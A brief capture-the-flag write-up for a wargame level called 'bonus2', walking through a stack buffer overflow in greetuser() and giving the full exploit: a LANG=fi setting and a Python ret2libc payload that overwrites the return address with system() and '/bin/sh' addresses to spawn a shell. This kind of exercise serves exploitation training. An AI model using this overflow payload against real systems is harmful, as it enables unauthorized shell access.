* In this challenge the main() except two arguments 
* copy the first 40 bytes of argv[1] to buff1[40] 
* copy the first 32 bytes of argv[2] to buff2[32]
* gets the value of LANG environment variable and assign a value to language global variable dependently
* copy the two buffers respectivly to top of the stack and call greetuser()

* depends on the value of language , greetuser copy a msg to msg[32] buffers
* then concatenate (ebp + 8 ==> which is the argv[1] + argv[2] from the main function.) with the greeting msg
* to solve this challenge i overwrite the return of greetuser with address of system().

to pwn this challenge :

+ first the change the environment variable to fi (so we can have the longest greeting msg on msg buffer)
==> export LANG=fi
+ cat | ./bonus2 $(python -c 'print "A"*40') $(python /tmp/bon2.py)

==> where the content of bon2.py :

-------------------------------------------
import struct

system = struct.pack("I", 0xb7e6b060)
ret = "RRRR"
bin_sh = struct.pack("I", 0xb7f8cc58)

print "B" * 18 + system + ret + bin_sh

 --------------------------------------------